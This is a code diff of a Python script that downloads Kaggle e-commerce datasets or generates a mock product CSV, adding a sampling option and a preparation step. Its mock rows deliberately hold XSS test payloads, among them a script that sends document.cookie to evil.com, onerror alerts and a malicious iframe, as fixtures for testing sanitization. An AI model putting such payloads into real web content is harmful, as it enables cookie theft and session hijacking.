@@ -21,7 +21,8 @@ def generate_local_demo():
     csv_content = [
         "sku,name,price,description,image_url,category,brand",
         'B07XYZ123,"Kids Robot Toy 🤖",29.99,"<div class=\'legacy-cms\' onclick=\\"track()\\">Your kids will <b>love</b> this! <script>fetch(\'https://evil.com/steal?c=\'+document.cookie)</script> <img src=x onerror=alert(1)> Response time < 2ms. Ages < 12.</div>","https://example.com/toy.jpg",Toys,RoboCorp',
-        'B07ABC456,"Gaming Monitor 27\\"","","Response time is < 1ms for ultimate performance. Great for games < 18+.","https://example.com/monitor.jpg",Electronics,ViewTech',
+        # Escaped double quotes according to RFC 4180 (using "" instead of \")
+        'B07ABC456,"Gaming Monitor 27""","","Response time is < 1ms for ultimate performance. Great for games < 18+.","https://example.com/monitor.jpg",Electronics,ViewTech',
         'B07XYZ123,"Duplicate SKU Entry",19.99,"Duplicate SKU check to verify deduplication algorithm.","https://example.com/toy.jpg",Toys,RoboCorp',
         'B07DEF789,"Healthy Organic Oats",4.50,"Simple healthy oats description without any HTML formatting.","",Groceries,EcoFoods',
         'B07GHI101,"Premium Wireless Headphones",149.99,"Listen in high fidelity. <iframe src=\'https://malicious-ad-network.com\'></iframe>","https://example.com/headphones.jpg",Electronics,AudioZen',
@@ -30,7 +31,6 @@ def generate_local_demo():
     
     # Generate 10,000 mock products to fulfill testing performance requirement
     for i in range(10000):
-        # Intersperse some errors and HTML tags to test sanitizer & validation
         if i % 100 == 0:
             desc = f"Mock description {i} with <script>alert(1)</script> XSS payload."
             price = "" # Empty price (invalid)
@@ -51,7 +51,7 @@ def generate_local_demo():
     print(f"Demo file successfully written to {demo_file} (10,000+ entries).")
 
 def main():
-    parser = argparse.ArgumentParser(description="Download public Kaggle e-commerce datasets using kagglehub.")
+    parser = argparse.ArgumentParser(description="Download public Kaggle e-commerce datasets and prepare them.")
     parser.add_argument(
         "--dataset", 
         type=str, 
@@ -59,41 +59,51 @@ def main():
         default="local-demo",
         help="Specify which dataset to download or generate."
     )
+    parser.add_argument(
+        "--sample",
+        type=int,
+        default=None,
+        help="Limit output to N rows during the preparation stage."
+    )
     args = parser.parse_args()
 
     if args.dataset == "local-demo":
         generate_local_demo()
-        return
-
-    kaggle_path = KAGGLE_DATASETS[args.dataset]
-    print(f"Downloading dataset '{args.dataset}' ({kaggle_path}) using kagglehub...")
-    
-    try:
-        # Downloads dataset to local cache directory automatically without requiring login/credentials
-        downloaded_path = kagglehub.dataset_download(kaggle_path)
-        print(f"Dataset downloaded to cache at: {downloaded_path}")
+    else:
+        kaggle_path = KAGGLE_DATASETS[args.dataset]
+        print(f"Downloading dataset '{args.dataset}' ({kaggle_path}) using kagglehub...")
         
-        # Copy file(s) to our local raw data folder
-        dest_dir = os.path.join(RAW_DIR, args.dataset)
-        os.makedirs(dest_dir, exist_ok=True)
-        
-        if os.path.isdir(downloaded_path):
-            for file_name in os.listdir(downloaded_path):
-                src_item = os.path.join(downloaded_path, file_name)
-                dest_item = os.path.join(dest_dir, file_name)
-                if os.path.isdir(src_item):
-                    shutil.copytree(src_item, dest_item, dirs_exist_ok=True)
-                else:
-                    shutil.copy(src_item, dest_item)
-        else:
-            shutil.copy(downloaded_path, dest_dir)
+        try:
+            downloaded_path = kagglehub.dataset_download(kaggle_path)
+            print(f"Dataset downloaded to cache at: {downloaded_path}")
             
-        print(f"Dataset successfully copied to local raw storage: {dest_dir}")
-        
+            dest_dir = os.path.join(RAW_DIR, args.dataset)
+            os.makedirs(dest_dir, exist_ok=True)
+            
+            if os.path.isdir(downloaded_path):
+                for file_name in os.listdir(downloaded_path):
+                    src_item = os.path.join(downloaded_path, file_name)
+                    dest_item = os.path.join(dest_dir, file_name)
+                    if os.path.isdir(src_item):
+                        shutil.copytree(src_item, dest_item, dirs_exist_ok=True)
+                    else:
+                        shutil.copy(src_item, dest_item)
+            else:
+                shutil.copy(downloaded_path, dest_dir)
+                
+            print(f"Dataset successfully copied to local raw storage: {dest_dir}")
+            
+        except Exception as e:
+            print(f"\nError downloading from Kaggle: {str(e)}")
+            print("Falling back to generating local mock dataset to ensure testability...")
+            generate_local_demo()
+            args.dataset = "local-demo"
+
+    try:
+        from prepare_datasets import process_dataset
+        process_dataset(args.dataset, args.sample)
     except Exception as e:
-        print(f"\nError downloading from Kaggle: {str(e)}")
-        print("Falling back to generating local mock dataset to ensure testability...")
-        generate_local_demo()
+        print(f"Failed to automatically prepare dataset: {str(e)}")
 
 if __name__ == "__main__":
     main()
